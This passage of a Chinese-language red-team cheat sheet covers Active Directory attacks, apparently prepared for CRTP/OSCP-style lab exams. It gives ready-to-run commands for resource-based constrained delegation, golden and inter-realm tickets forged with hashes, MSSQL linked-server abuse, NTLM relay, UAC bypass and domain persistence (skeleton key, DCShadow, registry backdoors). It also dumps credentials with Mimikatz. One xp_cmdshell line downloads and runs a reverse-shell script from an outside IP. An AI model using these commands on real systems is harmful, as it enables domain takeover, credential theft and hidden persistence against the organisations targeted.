<h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>如果我们损害出现在<em>后端服务</em>的RBCD属性中的<em>前端服务</em>，则利用与上面的受约束委派相同。但是，这不太常见。</p>
<p>更经常看到攻击RBCD是当我们有<code>GenericWrite</code>，<code>GenericAll</code>，<code>WriteProperty</code>，或<code>WriteDACL</code>许可在域中的计算机对象。这意味着我们可以<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>在该计算机帐户上写入属性，以添加受信任的SPN或计算机帐户以进行委派。我们甚至可以创建一个新的计算机帐户并添加它。就像上面的约束委派一样，这使我们可以在任何用户的上下文中破坏目标计算机。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Create a new machine account using PowerMad</span>
New<span class="token operator">-</span>MachineAccount <span class="token operator">-</span>MachineAccount InconspicuousMachineAccount <span class="token operator">-</span>Password $<span class="token punctuation">(</span>ConvertTo<span class="token operator">-</span>SecureString <span class="token string">'Compromised123!'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span>
<span class="token variable">$sid</span> = Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Identity InconspicuousMachineAccount <span class="token operator">-</span>Properties objectsid <span class="token punctuation">|</span> <span class="token function">Select</span> <span class="token operator">-</span>Expand objectsid
<span class="token variable">$SD</span> = <span class="token function">New-Object</span> Security<span class="token punctuation">.</span>AccessControl<span class="token punctuation">.</span>RawSecurityDescriptor <span class="token operator">-</span>ArgumentList <span class="token string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;<span class="token function"><span class="token punctuation">;</span>$<span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">)</span></span>)"</span>
<span class="token variable">$SDbytes</span> = <span class="token function">New-Object</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token variable">$SD</span><span class="token punctuation">.</span>BinaryLength<span class="token punctuation">)</span>
<span class="token variable">$SD</span><span class="token punctuation">.</span>GetBinaryForm<span class="token punctuation">(</span><span class="token variable">$SDbytes</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span>
Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Identity TargetSrv01 <span class="token punctuation">|</span> <span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span><span class="token function">Set</span> @&amp;<span class="token comment" spellcheck="true">#123;'msdsallowedtoactonbehalfofotheridentity'=$SDBytes&amp;#125;</span>

<span class="token comment" spellcheck="true"># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span>
<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>user:InconspicuousMachineAccount$ <span class="token operator">/</span>rc4:3644AC5E3D9441CCBCEF08CBAF98E910 <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:CIFS<span class="token operator">/</span>TargetSrv01<span class="token punctuation">.</span>corp1<span class="token punctuation">.</span>com <span class="token operator">/</span>ptt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="滥用域信任"><a href="#滥用域信任" class="headerlink" title="滥用域信任"></a><strong>滥用域信任</strong></h3><p>必须以DA特权运行。</p>
<h4 id="使用域信任密钥"><a href="#使用域信任密钥" class="headerlink" title="使用域信任密钥"></a><strong>使用域信任密钥</strong></h4><p>从DC中，<code>currentdomain\targetdomain$</code>使用<code>Mimikatz</code>（例如，使用<code>LSADump</code>或<code>DCSync</code>）转储信任帐户的哈希。然后，使用此信任密钥和域<code>SID</code>，使用<code>Mimikatz</code>伪造一个跨域<code>TGT</code>，将目标域的企业管理员组的<code>SID</code>添加到我们的“ <code>SID history</code>”中。</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用Rubeus.</p>
<blockquote>
<p>确保您具有正确的Rubeus版本。由于某些原因，我的某些编译二进制文件给出了错误<code>KDC_ERR_WRONG_REALM</code>，而CRTP提供的版本可以正常工作。</p>
</blockquote>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgs <span class="token operator">/</span>ticket:c:\ad\tools\mcorp<span class="token operator">-</span>ticket<span class="token punctuation">.</span>kirbi <span class="token operator">/</span>service:LDAP<span class="token operator">/</span>mcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span>dc:mcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span>ptt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在，我们可以DCSync目标域（请参见下文）。</p>
<h4 id="使用krbtgt哈希"><a href="#使用krbtgt哈希" class="headerlink" title="使用krbtgt哈希"></a><strong>使用krbtgt哈希</strong></h4><p>F从DC中，使用DCSync或LSADump转储krbtgt哈希。然后，像以前的方法一样，使用此哈希，使用Mimikatz伪造一个跨域TGT。</p>
<p>使用SID历史（<code>/sids</code>的）<code>*-516</code>和<code>S-1-5-9</code>以伪装的域控制器组和企业域控制器分别是在日志中的噪声低。</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>如果您在创建此票证时遇到问题，请尝试添加“ target”标志，例如<code>/target:moneycorp.local</code>.</p>
</blockquote>
<p>或者，生成具有EA组的SID历史记录的域管理员票证。</p>
<pre><code>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
</code></pre>
<p>现在，我们可以立即DCSync目标域，或使用计划任务获取反向shell。</p>
<h3 id="滥用林间信任"><a href="#滥用林间信任" class="headerlink" title="滥用林间信任"></a><strong>滥用林间信任</strong></h3><p>由于林是安全边界，因此我们只能访问已与我们入侵的域（我们的源域）共享的域服务。使用例如BloodHound查找在两个林中都具有帐户（具有相同用户名）的用户，然后尝试重用密码。此外，我们可以使用PowerView来搜寻林之间的外部组成员身份。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>DomainForeignGroupMember <span class="token operator">-</span>domain corp2<span class="token punctuation">.</span>com
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在某些情况下，可能会在林之间<em>禁用</em>SID过滤（导致上述情况的保护）。如果您运行<code>Get-DomainTrust</code>并看到该<code>TREAT_AS_EXTERNAL</code>属性，便是这种情况！在这种情况下，如上所述，您可以像域信任一样滥用目录林信任。请注意，您仍然可以<em>不</em>伪造车票500和1000之间的任何SID的，所以你不能成为DA（甚至没有间接通过组继承）。在这种情况下，寻找在域控制器上授予本地管理员或类似非域特权的组。有关更多信息，请参阅<a target="_blank" rel="noopener" href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">此博客文章</a>。</p>
<p>要模拟来自我们源域的用户以访问外部域中的服务，我们可以执行以下操作。如上述“使用域信任密钥”中那样提取林间信任密钥。</p>
<p>使用Mimikatz通过信任密钥为目标域生成TGT：</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后，使用Rubeus<code>CIFS</code>使用该TGT向TGS询问例如目标DC上的服务。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgs <span class="token operator">/</span>ticket:c:\ad\tools\eucorp<span class="token operator">-</span>tgt<span class="token punctuation">.</span>kirbi <span class="token operator">/</span>service:CIFS<span class="token operator">/</span>eurocorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>eurocorp<span class="token punctuation">.</span>local <span class="token operator">/</span>dc:eurocorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>eurocorp<span class="token punctuation">.</span>local <span class="token operator">/</span>ptt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在，我们可以将目标林的DC上的CIFS服务用作源域的DA（同样，只要此信任关系已配置为存在）。</p>
<h3 id="滥用MSSQL数据库进行横向移动"><a href="#滥用MSSQL数据库进行横向移动" class="headerlink" title="滥用MSSQL数据库进行横向移动"></a>滥用MSSQL数据库进行横向移动</h3><p>可以链接MSSQL数据库，这样，如果您破坏了一个数据库，则可以在特定用户（<code>sa</code>也许是）的上下文中对其他数据库执行查询（甚至命令！）。这甚至可以跨森林工作！如果执行SQL，则可以使用以下命令枚举数据库链接。</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 查找链接的服务器</span>
<span class="token keyword">EXEC</span> sp_linkedservers

<span class="token comment" spellcheck="true">-- 在链接服务器上运行SQL查询</span>
<span class="token keyword">select</span> mylogin <span class="token keyword">from</span> <span class="token keyword">openquery</span><span class="token punctuation">(</span><span class="token string">"dc01"</span><span class="token punctuation">,</span> <span class="token string">'select SYSTEM_USER as mylogin'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">-- 在远程服务器上启用“ xp_cmdshell”并执行命令</span>
<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'sp_configure '</span><span class="token string">'show advanced options'</span><span class="token string">', 1; reconfigure'</span><span class="token punctuation">)</span> AT DC01
<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'sp_configure '</span><span class="token string">'xp_cmdshell'</span><span class="token string">', 1; reconfigure'</span><span class="token punctuation">)</span> AT DC01
<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'xp_cmdshell '</span><span class="token string">'whoami'</span><span class="token string">' '</span><span class="token punctuation">)</span> AT DC01
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们还可以使用<a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a>在域中查找数据库，并收集有关（可达）数据库的更多信息。我们还可以自动在链接的数据库中查找并执行查询或命令（甚至通过多层数据库链接）。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取域中的MSSQL数据库，并测试连通性</span>
Get<span class="token operator">-</span>SQLInstanceDomain <span class="token punctuation">|</span> Get<span class="token operator">-</span>SQLConnectionTestThreaded <span class="token punctuation">|</span> <span class="token function">ft</span>

<span class="token comment" spellcheck="true"># 尝试获取所有域数据库上的信息</span>
Get<span class="token operator">-</span>SQLInstanceDomain <span class="token punctuation">|</span> Get<span class="token operator">-</span>SQLServerInfo

<span class="token comment" spellcheck="true"># 在单个可访问的数据库上获取信息</span>
Get<span class="token operator">-</span>SQLServerInfo <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql

<span class="token comment" spellcheck="true"># 扫描MSSQL错误配置以升级到SA</span>
Invoke<span class="token operator">-</span>SQLAudit <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance UFC<span class="token operator">-</span>SQLDEV

<span class="token comment" spellcheck="true"># 执行SQL查询</span>
Get<span class="token operator">-</span>SQLQuery <span class="token operator">-</span>Query <span class="token string">"SELECT system_user"</span> <span class="token operator">-</span>Instance UFC<span class="token operator">-</span>SQLDEV

<span class="token comment" spellcheck="true"># 运行命令（需要启用XP_CMDSHELL）</span>
Invoke<span class="token operator">-</span>SQLOSCmd <span class="token operator">-</span>Instance devsrv <span class="token operator">-</span>Command <span class="token string">"whoami"</span> <span class="token punctuation">|</span>  <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty CommandResults

<span class="token comment" spellcheck="true"># 自动查找所有链接的数据库</span>
Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links <span class="token punctuation">|</span> <span class="token function">ft</span>

<span class="token comment" spellcheck="true"># 如果在任何链接的数据库上启用了XP_CMDSHELL，则运行命令</span>
Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token operator">-</span>Query <span class="token string">'EXEC xp_cmdshell "whoami"'</span> <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links<span class="token punctuation">,</span>customquery <span class="token punctuation">|</span> <span class="token function">ft</span>

Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token operator">-</span>Query <span class="token string">'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"'</span> <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links<span class="token punctuation">,</span>customquery <span class="token punctuation">|</span> <span class="token function">ft</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果您具有对MSSQL数据库的低特权访问权限，并且不存在任何链接，则有可能通过使用<code>xp_dirtree</code>存储过程访问此共享来强制执行NTLM身份验证。如果成功，则可以收集SQL服务帐户的NetNTLM，并可能将其破解或中继，以破坏作为该服务帐户的计算机。</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">"\\192.168.49.67\share"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>中继哈希以通过身份验证为本地admin的示例命令（如果服务帐户具有这些特权）并运行<code>calc.exe</code>。忽略该<code>-c</code>参数尝试尝试<code>secretsdump</code>。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span class="token string">'calc.exe'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>有关更多信息（包括Windows和Linux），请参阅我的<a target="_blank" rel="noopener" href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/">OSCP备忘单和命令参考</a>。</p>
<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 检查易受攻击的程序和配置</span>
Invoke<span class="token operator">-</span>AllChecks

<span class="token comment" spellcheck="true"># 利用易受攻击的服务权限（不需要触摸磁盘）</span>
Invoke<span class="token operator">-</span>ServiceAbuse <span class="token operator">-</span>Name <span class="token string">"AbyssWebServer"</span> <span class="token operator">-</span>Command <span class="token string">"net localgroup Administrators domain\user /add"</span>

<span class="token comment" spellcheck="true"># 利用易受攻击的服务权限触发稳定的beacon</span>
<span class="token function">Write</span><span class="token operator">-</span>ServiceBinary <span class="token operator">-</span>Name <span class="token string">'AbyssWebServer'</span> <span class="token operator">-</span>Command <span class="token string">'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update'</span> <span class="token operator">-</span>Path <span class="token string">'C:\WebServer\Abyss'</span>
net stop AbyssWebServer
net <span class="token function">start</span> AbyssWebServer
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass  UAC"></a>Bypass  UAC</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/FatRodzianko/SharpBypassUAC">SharpBypassUAC</a>。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 生成EncodedCommand</span>
<span class="token keyword">echo</span> -n <span class="token string">'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update'</span> <span class="token operator">|</span> base64

<span class="token comment" spellcheck="true"># 使用 SharpBypassUAC e.g. 从CobaltStrike 的一个beacon</span>
beacon<span class="token operator">></span> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ<span class="token operator">==</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在某些情况下，运行手动Bypass  UAC （例如FODHelper bypass）可能会变得更好，而FODHelper旁路在PowerShell中执行起来非常简单。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># The command to execute in high integrity context</span>
<span class="token variable">$cmd</span> = <span class="token string">"cmd /c start powershell.exe"</span>
 
<span class="token comment" spellcheck="true"># Set the registry values</span>
<span class="token function">New-Item</span> <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Force
<span class="token function">New-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Name <span class="token string">"DelegateExecute"</span> <span class="token operator">-</span>Value <span class="token string">""</span> <span class="token operator">-</span>Force
<span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Name <span class="token string">"(default)"</span> <span class="token operator">-</span>Value <span class="token variable">$cmd</span> <span class="token operator">-</span>Force
 
<span class="token comment" spellcheck="true"># Trigger fodhelper to perform the bypass</span>
<span class="token function">Start-Process</span> <span class="token string">"C:\Windows\System32\fodhelper.exe"</span> <span class="token operator">-</span>WindowStyle Hidden
 
<span class="token comment" spellcheck="true"># Clean registry</span>
<span class="token function">Start-Sleep</span> 3
<span class="token function">Remove-Item</span> <span class="token string">"HKCU:\Software\Classes\ms-settings\"</span> <span class="token operator">-</span>Recurse <span class="token operator">-</span>Force
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><h3 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h3><p>只需删除一个二进制文件即可。经典😎🚩</p>
<p>在当前用户文件夹中，将在当前用户登录时触发：</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或在启动文件夹中，需要管理特权，但在启动时<em>以及</em>任何用户登录时将以SYSTEM身份触发：</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="域持久性"><a href="#域持久性" class="headerlink" title="域持久性"></a>域持久性</h2><p>必须以DA特权运行。</p>
<h3 id="Mimikatz万能钥匙攻击"><a href="#Mimikatz万能钥匙攻击" class="headerlink" title="Mimikatz万能钥匙攻击"></a>Mimikatz万能钥匙攻击</h3><p>从DC运行。为所有用户🚩启用密码“ mimikatz”。</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">privilege::debug
misc::skeleton
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="使用PowerView授予特定的用户DCSync权限"><a href="#使用PowerView授予特定的用户DCSync权限" class="headerlink" title="使用PowerView授予特定的用户DCSync权限"></a>使用PowerView授予特定的用户DCSync权限</h3><p>随时为您提供用户选择的DCSync权限。在某些设置中可能会逃避检测。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Add<span class="token operator">-</span>ObjectACL <span class="token operator">-</span>TargetDistinguishedName <span class="token string">"dc=dollarcorp,dc=moneycorp,dc=local"</span> <span class="token operator">-</span>PrincipalSamAccountName student355 <span class="token operator">-</span>Rights DCSync
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="域控制器DSRM管理员"><a href="#域控制器DSRM管理员" class="headerlink" title="域控制器DSRM管理员"></a>域控制器DSRM管理员</h3><p>DSRM管理员是DC的本地管理员帐户。首先需要启用远程登录。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">New-ItemProperty</span> <span class="token string">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="token operator">-</span>Name <span class="token string">"DsrmAdminLogonBehavior"</span> <span class="token operator">-</span>Value 2 <span class="token operator">-</span>PropertyType DWORD
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在，我们可以使用之前转储在DC上的本地管理哈希值远程登录（使用<code>lsadump::sam</code>，请参见下面的“使用Mimikatz转储秘密”）。使用例如“越过哈希”来获得会话（请参见上面的“ Mimikatz”）。</p>
<h3 id="修改安全描述符以进行远程WMI访问"><a href="#修改安全描述符以进行远程WMI访问" class="headerlink" title="修改安全描述符以进行远程WMI访问"></a>修改安全描述符以进行远程WMI访问</h3><p>使用<code>Set-RemoteWMI.ps1</code>cmdlet向用户WMI访问计算机。可以运行以持久访问例如DC。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>RemoteWMI <span class="token operator">-</span>UserName student1 <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>namespace <span class="token string">'root\cimv2'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有关执行，请参见上面的“使用WMI执行命令”。</p>
<h3 id="修改PowerShell远程访问的安全描述符"><a href="#修改PowerShell远程访问的安全描述符" class="headerlink" title="修改PowerShell远程访问的安全描述符"></a>修改PowerShell远程访问的安全描述符</h3><p>使用<code>Set-RemotePSRemoting.ps1</code>cmdlet向用户PowerShell远程访问计算机。可以运行以持久访问例如DC。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>RemotePSRemoting <span class="token operator">-</span>UserName student1 <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有关执行，请参见上面的“使用PowerShell Remoting执行命令”。</p>
<h3 id="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"><a href="#修改DC注册表安全描述符以使用DAMP进行远程哈希检索" class="headerlink" title="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"></a>修改DC注册表安全描述符以使用DAMP进行远程哈希检索</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/DAMP">DAMP工具</a>，我们就可以借壳DC注册表来给我们上的访问<code>SAM</code>，<code>SYSTEM</code>以及<code>SECURITY</code>注册表配置单元。这使我们能够远程转储DC机密（哈希）。</p>
<p>我们使用<code>Add-RemoteRegBackdoor.ps1</code>来自DAMP的cmdlet添加后门。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Add<span class="token operator">-</span>RemoteRegBackdoor <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>Trustee Student355
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用<code>RemoteHashRetrieval.ps1</code>DAMP中的cmdlet远程转储秘密（以“受信任”用户身份运行）。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取针对银票攻击的机器帐户哈希</span>
Get<span class="token operator">-</span>RemoteMachineAccountHash <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc

<span class="token comment" spellcheck="true"># 获取本地帐户哈希</span>
Get<span class="token operator">-</span>RemoteLocalAccountHash <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc

<span class="token comment" spellcheck="true"># 获取缓存的凭据（如果有）</span>
Get<span class="token operator">-</span>RemoteCachedCredential <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow是一种通过临时模仿域控制器来掩盖某些动作的攻击。如果您在根域中具有Domain Admin或Enterprise Admin特权，则可以将其用于林级别的持久性。</p>
<p>（可选）作为域管理员，为选定的用户提供DCShadow攻击所需的特权（使用<code>Set-DCShadowPermissions.ps1</code>cmdlet）。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DCShadowPermissions <span class="token operator">-</span>FakeDC mcorp<span class="token operator">-</span>student35 <span class="token operator">-</span>SamAccountName root355user <span class="token operator">-</span>Username student355 <span class="token operator">-</span>Verbose
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后，在任何计算机上，使用Mimikatz进行DCShadow攻击。</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext"># 为用户设置SPN
lsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# 设置用户的SID历史记录（有效地授予他们企业管理员权限）
lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# 为用户设置AdminSDHolder容器上的完全控制权限
## 需要检索当前的ACL：
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl

## 然后获取目标用户的SID：
Get-NetUser -UserName student355 | select objectsid

## 最后，添加完全控制原语 (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后，从DA会话或以前提供DCShadowPermissions的用户的会话中，运行DCShadow攻击。先前上演的动作将在不保留日志的情况下执行😈</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">lsadump::dcshadow /push
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h2><h3 id="LSASS保护"><a href="#LSASS保护" class="headerlink" title="LSASS保护"></a>LSASS保护</h3><p>有时，LSASS被配置为作为受保护进程（PPL）运行。您可以使用PowerShell进行查询，如下所示。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa <span class="token operator">-</span>Name <span class="token string">"RunAsPPL"</span> 
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在这种情况下，您不仅可以转储或解析LSASS，还需要使用禁用该保护<code>mimidrv.sys</code>。我不会在这里讨论如何做。</p>
<h3 id="Dumping-secrets-with-Mimikatz"><a href="#Dumping-secrets-with-Mimikatz" class="headerlink" title="Dumping secrets with Mimikatz"></a>Dumping secrets with Mimikatz</h3><pre class="line-numbers language-plaintext"><code class="language-plaintext"># 转储登录密码
sekurlsa::logonpasswords

# 从DC转储所有域散列
## 注意：带有/patch的所有内容都很嘈杂，因为它_writes_到LSASS🚩
lsadump::lsa /patch

# 仅转储本地用户
